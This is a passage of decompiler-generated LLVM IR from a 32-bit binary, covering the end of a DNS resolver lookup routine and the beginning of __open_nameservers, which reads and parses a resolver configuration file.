  %v9_80534c1 = or i64 %v8_80534c1, %v5_80534c1
  %v10_80534c1 = zext i32 %v3_80534c1 to i64
  %v11_80534c1 = sdiv i64 %v9_80534c1, %v10_80534c1
  %v12_80534c1 = trunc i64 %v11_80534c1 to i32
  store i32 %v12_80534c1, i32* %eax.global-to-local, align 4
  %v13_80534c1 = srem i64 %v9_80534c1, %v10_80534c1
  %v14_80534c1 = trunc i64 %v13_80534c1 to i32
  store i32 %v14_80534c1, i32* %edx.global-to-local, align 4
  %v1_80534c8 = icmp eq i32 %v14_80534c1, 0
  store i32 %v14_80534c1, i32* %v2_80534bb, align 4
  %v1_80534ce = icmp eq i1 %v1_80534c8, false
  br i1 %v1_80534ce, label %dec_label_pc_80534d4, label %dec_label_pc_80534d0

dec_label_pc_80534d0:                             ; preds = %dec_label_pc_80534bb
  %v0_80534d0 = load i32, i32* @esp, align 4
  %v1_80534d0 = add i32 %v0_80534d0, 28
  %v2_80534d0 = inttoptr i32 %v1_80534d0 to i32*
  %v3_80534d0 = load i32, i32* %v2_80534d0, align 4
  %v4_80534d0 = add i32 %v3_80534d0, 1
  store i32 %v4_80534d0, i32* %v2_80534d0, align 4
  br label %dec_label_pc_80534d4

dec_label_pc_80534d4:                             ; preds = %dec_label_pc_80534bb, %dec_label_pc_80534d0
  %v0_80534d4 = load i32, i32* @esp, align 4
  %v1_80534d4 = add i32 %v0_80534d4, 36
  %v2_80534d4 = inttoptr i32 %v1_80534d4 to i32*
  store i32 -1, i32* %v2_80534d4, align 4
  br label %dec_label_pc_80534dc.backedge

dec_label_pc_80534dc.backedge:                    ; preds = %dec_label_pc_80534d4, %dec_label_pc_80534b5, %dec_label_pc_8053152, %dec_label_pc_8053240
  %v0_80534dc.pre = load i32, i32* @esp, align 4
  %v1_80534dc = add i32 %v0_80534dc.pre, 28
  %v2_80534dc = inttoptr i32 %v1_80534dc to i32*
  %v3_80534dc = load i32, i32* %v2_80534dc, align 4
  %tmp110 = icmp ult i32 %v3_80534dc, 3
  br i1 %tmp110, label %dec_label_pc_8052f3c, label %dec_label_pc_8053501

dec_label_pc_8053501:                             ; preds = %dec_label_pc_8052eb6, %dec_label_pc_8052f52, %dec_label_pc_8053046, %dec_label_pc_80534dc.backedge, %entry, %dec_label_pc_8052e90, %dec_label_pc_8052e98, %dec_label_pc_8052ea6
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8052ea6 ], [ -1, %dec_label_pc_8052e98 ], [ -1, %dec_label_pc_8052e90 ], [ -1, %entry ], [ %v0_8052f03, %dec_label_pc_80534dc.backedge ], [ %v0_8052f03, %dec_label_pc_8053046 ], [ %v0_8052f03, %dec_label_pc_8052f52 ], [ %v0_8052f03, %dec_label_pc_8052eb6 ]
  %v0_8053501 = call i32 @__GI___h_errno_location()
  store i32 %v0_8053501, i32* %eax.global-to-local, align 4
  %v1_8053506 = inttoptr i32 %v0_8053501 to i32*
  store i32 -1, i32* %v1_8053506, align 4
  %v0_805350c = load i32, i32* @esp, align 4
  %v1_805350c = add i32 %v0_805350c, 56
  %v2_805350c = inttoptr i32 %v1_805350c to i32*
  %v3_805350c = load i32, i32* %v2_805350c, align 4
  store i32 %v3_805350c, i32* %eax.global-to-local, align 4
  %v2_8053510 = add i32 %v0_805350c, 44
  %v3_8053510 = inttoptr i32 %v2_8053510 to i32*
  store i32 %v3_805350c, i32* %v3_8053510, align 4
  br label %dec_label_pc_8053514

dec_label_pc_8053514:                             ; preds = %dec_label_pc_8053279, %dec_label_pc_8053251, %dec_label_pc_8053501
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_8053501 ], [ %v0_8052f03, %dec_label_pc_8053279 ], [ %v0_8052f03, %dec_label_pc_8053251 ]
  %v0_8053514 = load i32, i32* @esp, align 4
  %v1_8053514 = add i32 %v0_8053514, 20
  %v2_8053514 = inttoptr i32 %v1_8053514 to i32*
  %v3_8053514 = load i32, i32* %v2_8053514, align 4
  %v13_8053514 = icmp eq i32 %v3_8053514, -1
  br i1 %v13_8053514, label %dec_label_pc_8053514.dec_label_pc_805352a_crit_edge, label %dec_label_pc_805351b

dec_label_pc_8053514.dec_label_pc_805352a_crit_edge: ; preds = %dec_label_pc_8053514
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_805352a

dec_label_pc_805351b:                             ; preds = %dec_label_pc_8053514
  %v3_805351e = load i32, i32* %v2_8053514, align 4
  %v5_805351e = add i32 %v0_8053514, -16
  %v6_805351e = inttoptr i32 %v5_805351e to i32*
  store i32 %v3_805351e, i32* %v6_805351e, align 4
  %v1_8053522 = sext i16 %stack_var_-180.1 to i32
  %v2_8053522 = call i32 @__libc_close(i32 %v1_8053522)
  store i32 %v2_8053522, i32* %eax.global-to-local, align 4
  %v0_8053527 = load i32, i32* @esp, align 4
  %v1_8053527 = add i32 %v0_8053527, 16
  br label %dec_label_pc_805352a

dec_label_pc_805352a:                             ; preds = %dec_label_pc_8053514.dec_label_pc_805352a_crit_edge, %dec_label_pc_805351b
  %v1_8053531.pre-phi = phi i32 [ %.pre, %dec_label_pc_8053514.dec_label_pc_805352a_crit_edge ], [ %v1_8053522, %dec_label_pc_805351b ]
  %v0_805352a = phi i32 [ %v0_8053514, %dec_label_pc_8053514.dec_label_pc_805352a_crit_edge ], [ %v1_8053527, %dec_label_pc_805351b ]
  %v1_805352d = add i32 %v0_805352a, 12
  %v2_805352d = inttoptr i32 %v1_805352d to i32*
  %v3_805352d = load i32, i32* %v2_805352d, align 4
  %v5_805352d = add i32 %v0_805352a, -16
  %v6_805352d = inttoptr i32 %v5_805352d to i32*
  store i32 %v3_805352d, i32* %v6_805352d, align 4
  %v2_8053531 = call i32 @free(i32 %v1_8053531.pre-phi)
  store i32 %v2_8053531, i32* %eax.global-to-local, align 4
  %v1_8053536 = load i32, i32* @esp, align 4
  %v2_8053536 = inttoptr i32 %v1_8053536 to i32*
  store i32 %v2_8052e6e, i32* %v2_8053536, align 4
  %v2_8053539 = call i32 @free(i32 %v1_8053531.pre-phi)
  store i32 %v2_8053539, i32* @eax, align 4
  %v0_805353e = load i32, i32* @esp, align 4
  %v1_8053541 = add i32 %v0_805353e, 56
  %v2_8053541 = inttoptr i32 %v1_8053541 to i32*
  %v3_8053541 = load i32, i32* %v2_8053541, align 4
  %v13_8053541 = icmp eq i32 %v3_8053541, -1
  %v1_8053546 = add i32 %v0_805353e, 32
  %v2_8053546 = inttoptr i32 %v1_8053546 to i32*
  store i32 -1, i32* %v2_8053546, align 4
  br i1 %v13_8053541, label %dec_label_pc_805352a.dec_label_pc_805359d_crit_edge, label %dec_label_pc_8053550

dec_label_pc_805352a.dec_label_pc_805359d_crit_edge: ; preds = %dec_label_pc_805352a
  %v0_805359d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805359d

dec_label_pc_8053550:                             ; preds = %dec_label_pc_805352a
  %v0_8053550 = load i32, i32* @ecx, align 4
  %v1_8053550 = load i32, i32* @esp, align 4
  %v2_8053550 = add i32 %v1_8053550, -4
  %v3_8053550 = inttoptr i32 %v2_8053550 to i32*
  store i32 %v0_8053550, i32* %v3_8053550, align 4
  %v1_8053551 = add i32 %v1_8053550, -8
  %v2_8053551 = inttoptr i32 %v1_8053551 to i32*
  store i32 ptrtoint (i8** @global_var_80602e8.241 to i32), i32* %v2_8053551, align 4
  %v1_8053556 = add i32 %v1_8053550, -12
  %v2_8053556 = inttoptr i32 %v1_8053556 to i32*
  store i32 134552351, i32* %v2_8053556, align 4
  %v1_805355b = add i32 %v1_8053550, 184
  store i32 %v1_805355b, i32* %ebx.global-to-local, align 4
  %v2_8053562 = add i32 %v1_8053550, -16
  %v3_8053562 = inttoptr i32 %v2_8053562 to i32*
  store i32 %v1_805355b, i32* %v3_8053562, align 4
  %v3_8053563 = call i32 @__pthread_return_void(i32 %v1_8053531.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8053563, i32* %eax.global-to-local, align 4
  %v0_8053568 = load i32, i32* @esp, align 4
  %v1_8053568 = inttoptr i32 %v0_8053568 to i32*
  store i32 ptrtoint (i8** @global_var_80602e8.241 to i32), i32* %v1_8053568, align 4
  %v2_805356f = call i32 @__pthread_return_0(i32 %v1_8053531.pre-phi)
  store i32 %v2_805356f, i32* %eax.global-to-local, align 4
  %v0_8053574 = load i32, i32* @esp, align 4
  %v1_8053574 = add i32 %v0_8053574, 60
  %v2_8053574 = inttoptr i32 %v1_8053574 to i32*
  %v3_8053574 = load i32, i32* %v2_8053574, align 4
  store i32 %v3_8053574, i32* %eax.global-to-local, align 4
  %v1_8053578 = add i32 %v0_8053574, 56
  %v2_8053578 = inttoptr i32 %v1_8053578 to i32*
  %v3_8053578 = load i32, i32* %v2_8053578, align 4
  store i32 %v3_8053578, i32* %edx.global-to-local, align 4
  %v1_805357c = trunc i32 %v3_8053574 to i16
  store i16 %v1_805357c, i16* @global_var_805a044.243, align 4
  %v1_8053582 = inttoptr i32 %v0_8053574 to i32*
  %v2_8053582 = load i32, i32* %v1_8053582, align 4
  store i32 %v2_8053582, i32* @eax, align 4
  %v3_8053582 = add i32 %v0_8053574, 4
  %v1_8053583 = sext i32 %v3_8053578 to i64
  store i64 %v1_8053583, i64* @global_var_8060300.242, align 256
  %v1_8053589 = inttoptr i32 %v3_8053582 to i32*
  %v2_8053589 = load i32, i32* %v1_8053589, align 4
  store i32 %v2_8053589, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8053589, align 4
  %v0_805358c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805358c, i32* %v1_8053582, align 4
  %v3_805358d = call i32 @__pthread_return_void(i32 %v1_8053531.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805358d, i32* %eax.global-to-local, align 4
  %v0_8053592 = load i32, i32* @esp, align 4
  %v1_8053592 = add i32 %v0_8053592, 32
  %v2_8053592 = inttoptr i32 %v1_8053592 to i32*
  store i32 -1, i32* %v2_8053592, align 4
  br label %dec_label_pc_805359a

dec_label_pc_805359a:                             ; preds = %dec_label_pc_805340e, %dec_label_pc_8053550
  %v0_805359a = load i32, i32* @esp, align 4
  %v1_805359a = add i32 %v0_805359a, 16
  br label %dec_label_pc_805359d

dec_label_pc_805359d:                             ; preds = %dec_label_pc_805352a.dec_label_pc_805359d_crit_edge, %dec_label_pc_805359a
  %v0_805359d = phi i32 [ %v0_805359d.pre, %dec_label_pc_805352a.dec_label_pc_805359d_crit_edge ], [ %v1_805359a, %dec_label_pc_805359a ]
  %v1_805359d = add i32 %v0_805359d, 16
  %v2_805359d = inttoptr i32 %v1_805359d to i32*
  %v3_805359d = load i32, i32* %v2_805359d, align 4
  store i32 %v3_805359d, i32* %eax.global-to-local, align 4
  %v1_80535a1 = add i32 %v0_805359d, 220
  %v1_80535a7 = inttoptr i32 %v1_80535a1 to i32*
  %v2_80535a7 = load i32, i32* %v1_80535a7, align 4
  store i32 %v2_80535a7, i32* @ebx, align 4
  %v3_80535a7 = add i32 %v0_805359d, 224
  %v1_80535a8 = inttoptr i32 %v3_80535a7 to i32*
  %v2_80535a8 = load i32, i32* %v1_80535a8, align 4
  store i32 %v2_80535a8, i32* @esi, align 4
  %v3_80535a8 = add i32 %v0_805359d, 228
  %v1_80535a9 = inttoptr i32 %v3_80535a8 to i32*
  %v2_80535a9 = load i32, i32* %v1_80535a9, align 4
  store i32 %v2_80535a9, i32* @edi, align 4
  %v3_80535a9 = add i32 %v0_805359d, 232
  %v1_80535aa = inttoptr i32 %v3_80535a9 to i32*
  %v2_80535aa = load i32, i32* %v1_80535aa, align 4
  store i32 %v2_80535aa, i32* @ebp, align 4
  ret i32 %v3_805359d

; uselistorder directives
  uselistorder i32 %v0_805359d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8053574, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805352a, { 1, 0 }
  uselistorder i32 %v1_8053531.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_80534dc.pre, { 1, 0 }
  uselistorder i32 %v5_80534af, { 1, 0 }
  uselistorder i32 %v3_80534af, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8053477, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8053440, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805340e, { 1, 0 }
  uselistorder i32 %v3_80533ed, { 1, 0, 2 }
  uselistorder i32 %v0_80533de, { 1, 0 }
  uselistorder i32 %v5_80533d4, { 1, 0 }
  uselistorder i32* %v3_80533d4, { 1, 0 }
  uselistorder i32 %v0_80532aa67, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_80533d4, { 2, 1, 0 }
  uselistorder i32 %v5_80533ce, { 1, 0 }
  uselistorder i32 %v1_80533cd, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80533c9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805338d, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8053367, { 1, 0 }
  uselistorder i32 %v1_8053358, { 1, 0 }
  uselistorder i32 %v3_8053329, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8053317, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_80532be, { 1, 2, 0 }
  uselistorder i32 %v0_80532be, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8053298, { 1, 0 }
  uselistorder i32 %v0_80532a0, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_805328e, { 1, 0, 2 }
  uselistorder i32 %v5_805323a, { 1, 0 }
  uselistorder i32* %v2_805323a, { 1, 0, 2 }
  uselistorder i32 %v3_80531f2, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80531d8, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_80531b7, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8053197, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_805313d, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8053122, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_805310b, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8053093, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053046, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8053027, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805300b, { 1, 0 }
  uselistorder i32 %v3_8053000, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8052ffd, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8052fa2, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8052f9d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052f86, { 1, 0 }
  uselistorder i32 %v1_8052f52, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8052f4383, { 2, 1, 0 }
  uselistorder i16 %v0_8052f03, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_8052efc, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8052e6e, { 6, 3, 4, 9, 2, 10, 11, 1, 0, 5, 8, 7, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ebx.global-to-local, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 78, 79, 80, 81, 82, 83, 84, 85, 72, 87, 88, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 59, 56, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 86, 73, 74, 75, 76, 77 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 7, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 160, { 0, 3, 1, 2 }
  uselistorder i32 68, { 4, 1, 2, 3, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 100, { 0, 4, 2, 3, 1 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 3, 2, 7, 6, 5, 4, 8, 0 }
  uselistorder i32 17, { 12, 9, 5, 8, 2, 3, 1, 0, 13, 4, 11, 10, 6, 7 }
  uselistorder i32 176, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 0, 2, 3, 1 }
  uselistorder i32 72, { 0, 2, 3, 1, 4 }
  uselistorder i32 84, { 4, 0, 5, 1, 3, 2 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 57, 58 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 26, 25, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 27 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 26, 21, 24, 22, 25, 27, 28, 23, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @__libc_close, { 0, 13, 12, 17, 16, 15, 14, 19, 18, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805a044.243, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8060300.242, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80602e8.241 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_80602e8.241, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 0, 1, 2, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805359d, { 1, 0 }
  uselistorder label %dec_label_pc_805359a, { 1, 0 }
  uselistorder label %dec_label_pc_805352a, { 1, 0 }
  uselistorder label %dec_label_pc_8053514, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053501, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_80534dc.backedge, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80534d4, { 1, 0 }
  uselistorder label %dec_label_pc_80534bb, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8053470, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_805340e, { 1, 0 }
  uselistorder label %dec_label_pc_80533de, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_80533d4, { 1, 0 }
  uselistorder label %dec_label_pc_80533c9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80533c6, { 1, 0 }
  uselistorder label %dec_label_pc_8053341, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8053298, { 1, 0 }
  uselistorder label %dec_label_pc_805310b, { 1, 0 }
  uselistorder label %dec_label_pc_80530d4, { 1, 0 }
  uselistorder label %dec_label_pc_8053046, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052f52, { 1, 0 }
  uselistorder label %dec_label_pc_8052f3c, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_80535ac = load i32, i32* @ebp, align 4
  store i32 134552351, i32* %stack_var_-216, align 4
  %v3_80535bb = ptrtoint i32* %stack_var_-216 to i32
  %v2_80535c0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80535c0, i32* @eax, align 4
  %v2_80535c8 = call i32 @__pthread_return_void(i32 %v2_80535c0, i32 134552351)
  %v1_80535d4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a048.183 to i32))
  store i32 %v1_80535d4, i32* @eax, align 4
  %v0_80535dc = load i32, i32* @global_var_8060734.184, align 4
  %tmp41 = icmp slt i32 %v0_80535dc, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_80537d3, label %dec_label_pc_80535e9

dec_label_pc_80535e9:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_8058650.246 to i32), i32* %stack_var_-216, align 4
  %v2_80535f5 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805861e.247 to i32), i32 ptrtoint (i32* @global_var_8058650.246 to i32))
  store i32 %v2_80535f5, i32* @eax, align 4
  %v1_80535fd = icmp eq i32 %v2_80535f5, 0
  store i32 %v2_80535f5, i32* @ebp, align 4
  %v1_8053601 = icmp eq i1 %v1_80535fd, false
  br i1 %v1_8053601, label %dec_label_pc_805379e.preheader, label %dec_label_pc_8053607

dec_label_pc_8053607:                             ; preds = %dec_label_pc_80535e9
  store i32 ptrtoint (i32* @global_var_8058650.246 to i32), i32* %stack_var_-216, align 4
  %v2_8053613 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805862f.248 to i32), i32 ptrtoint (i32* @global_var_8058650.246 to i32))
  %v1_805361b = icmp eq i32 %v2_8053613, 0
  store i32 %v2_8053613, i32* @ebp, align 4
  %v1_805361f = icmp eq i1 %v1_805361b, false
  br i1 %v1_805361f, label %dec_label_pc_805379e.preheader, label %dec_label_pc_80537c8

dec_label_pc_805379e.preheader:                   ; preds = %dec_label_pc_80535e9, %dec_label_pc_8053607
  %v2_80537a5 = ptrtoint i32* %stack_var_-180 to i32
  %v3_80536d9 = add i32 %v3_80535bb, 164
  %v4_80536c8 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_805379e

dec_label_pc_805362a:                             ; preds = %dec_label_pc_8053635
  %v1_805362a = add i32 %v0_805362a56, 1
  store i32 %v1_805362a, i32* @ebx, align 4
  %v1_805362b = inttoptr i32 %v1_805362a to i8*
  %v2_805362b = load i8, i8* %v1_805362b, align 1
  %v3_805362b = zext i8 %v2_805362b to i32
  %v5_805362b = and i32 %v6_805362b59, -256
  %v6_805362b = or i32 %v3_805362b, %v5_805362b
  store i32 %v6_805362b, i32* @ecx, align 4
  %v4_805362d = icmp eq i8 %v2_805362b, 0
  br i1 %v4_805362d, label %dec_label_pc_805379e, label %dec_label_pc_8053635

dec_label_pc_8053635:                             ; preds = %dec_label_pc_8053635.lr.ph, %dec_label_pc_805362a
  %v6_805362b59 = phi i32 [ %v6_805362b53, %dec_label_pc_8053635.lr.ph ], [ %v6_805362b, %dec_label_pc_805362a ]
  %v2_805362b58 = phi i8 [ %v2_805362b50, %dec_label_pc_8053635.lr.ph ], [ %v2_805362b, %dec_label_pc_805362a ]
  %v1_805362b57 = phi i8* [ %v1_805362b49, %dec_label_pc_8053635.lr.ph ], [ %v1_805362b, %dec_label_pc_805362a ]
  %v0_805362a56 = phi i32 [ %v0_805362b.pre, %dec_label_pc_8053635.lr.ph ], [ %v1_805362a, %dec_label_pc_805362a ]
  store i32 %v0_8053635.pre, i32* @eax, align 4
  %v2_805363a = sext i8 %v2_805362b58 to i32
  store i32 %v2_805363a, i32* @edx, align 4
  %v2_805363d = mul nsw i32 %v2_805363a, 2
  %v3_805363d = add i32 %v0_8053635.pre, %v2_805363d
  %v4_805363d = inttoptr i32 %v3_805363d to i8*
  %v5_805363d = load i8, i8* %v4_805363d, align 1
  %v6_805363d = and i8 %v5_805363d, 32
  %v7_805363d = icmp eq i8 %v6_805363d, 0
  %v1_8053641 = icmp eq i1 %v7_805363d, false
  br i1 %v1_8053641, label %dec_label_pc_805362a, label %dec_label_pc_8053643

dec_label_pc_8053643:                             ; preds = %dec_label_pc_8053635
  %v10_8053643 = icmp eq i8 %v2_805362b58, 10
  br i1 %v10_8053643, label %dec_label_pc_805379e, label %dec_label_pc_805364c

dec_label_pc_805364c:                             ; preds = %dec_label_pc_8053643
  %v10_805364c = icmp eq i8 %v2_805362b58, 35
  %v1_8053657 = icmp eq i1 %v10_805364c, false
  br i1 %v1_8053657, label %dec_label_pc_80536a8.preheader, label %dec_label_pc_805379e

dec_label_pc_80536a8.preheader:                   ; preds = %dec_label_pc_805364c
  %v2_80536a86 = load i8, i8* %v1_805362b57, align 1
  %v3_80536a87 = icmp eq i8 %v2_80536a86, 0
  br i1 %v3_80536a87, label %dec_label_pc_80536b4, label %dec_label_pc_80536ad

dec_label_pc_805365e:                             ; preds = %dec_label_pc_80536ad
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8053662 = load i32, i32* @esp, align 4
  %v3_8053662 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8053662 = add nuw nsw i32 %v3_8053662, 152
  %v5_8053662 = add i32 %v4_8053662, %v1_8053662
  %v6_8053662 = inttoptr i32 %v5_8053662 to i32*
  store i32 %v0_8053662, i32* %v6_8053662, align 4
  %v0_805366c.pre = load i32, i32* @ebx, align 4
  %v4_805366c.pre = load i32, i32* @ecx, align 4
  %v1_805366c60 = inttoptr i32 %v0_805366c.pre to i8*
  %v2_805366c61 = load i8, i8* %v1_805366c60, align 1
  %v3_805366c62 = zext i8 %v2_805366c61 to i32
  %v5_805366c63 = and i32 %v4_805366c.pre, -256
  %v6_805366c64 = or i32 %v3_805366c62, %v5_805366c63
  %v4_805366e65 = icmp eq i8 %v2_805366c61, 0
  br i1 %v4_805366e65, label %dec_label_pc_805368b.preheader, label %dec_label_pc_8053672.lr.ph

dec_label_pc_8053672.lr.ph:                       ; preds = %dec_label_pc_805365e
  %v0_8053672.pre = load i32, i32* @global_var_8059dd8, align 8
  br label %dec_label_pc_8053672

dec_label_pc_805366b:                             ; preds = %dec_label_pc_8053680
  %v1_805366b = add i32 %v0_805366b67, 1
  store i32 %v1_805366b, i32* @ebx, align 4
  %v1_805366c = inttoptr i32 %v1_805366b to i8*
  %v2_805366c = load i8, i8* %v1_805366c, align 1
  %v3_805366c = zext i8 %v2_805366c to i32
  %v5_805366c = and i32 %v6_805366c69, -256
  %v6_805366c = or i32 %v3_805366c, %v5_805366c
  %v4_805366e = icmp eq i8 %v2_805366c, 0
  br i1 %v4_805366e, label %dec_label_pc_805368b.preheader, label %dec_label_pc_8053672

dec_label_pc_8053672:                             ; preds = %dec_label_pc_8053672.lr.ph, %dec_label_pc_805366b
  %v6_805366c69 = phi i32 [ %v6_805366c64, %dec_label_pc_8053672.lr.ph ], [ %v6_805366c, %dec_label_pc_805366b ]
  %v2_805366c68 = phi i8 [ %v2_805366c61, %dec_label_pc_8053672.lr.ph ], [ %v2_805366c, %dec_label_pc_805366b ]
  %v0_805366b67 = phi i32 [ %v0_805366c.pre, %dec_label_pc_8053672.lr.ph ], [ %v1_805366b, %dec_label_pc_805366b ]
  store i32 %v0_8053672.pre, i32* @eax, align 4
  %v2_8053677 = sext i8 %v2_805366c68 to i32
  store i32 %v2_8053677, i32* @edx, align 4
  %v2_805367a = mul nsw i32 %v2_8053677, 2
  %v3_805367a = add i32 %v0_8053672.pre, %v2_805367a
  %v4_805367a = inttoptr i32 %v3_805367a to i8*
  %v5_805367a = load i8, i8* %v4_805367a, align 1
  %v6_805367a = and i8 %v5_805367a, 32
  %v7_805367a = icmp eq i8 %v6_805367a, 0
  %v1_805367e = icmp eq i1 %v7_805367a, false
  br i1 %v1_805367e, label %dec_label_pc_805368b.preheader, label %dec_label_pc_8053680

dec_label_pc_8053680:                             ; preds = %dec_label_pc_8053672
  %v10_8053680 = icmp eq i8 %v2_805366c68, 10
  %v1_8053683 = icmp eq i1 %v10_8053680, false
  br i1 %v1_8053683, label %dec_label_pc_805366b, label %dec_label_pc_805368b.preheader

dec_label_pc_805368b.preheader:                   ; preds = %dec_label_pc_8053680, %dec_label_pc_8053672, %dec_label_pc_805366b, %dec_label_pc_805365e
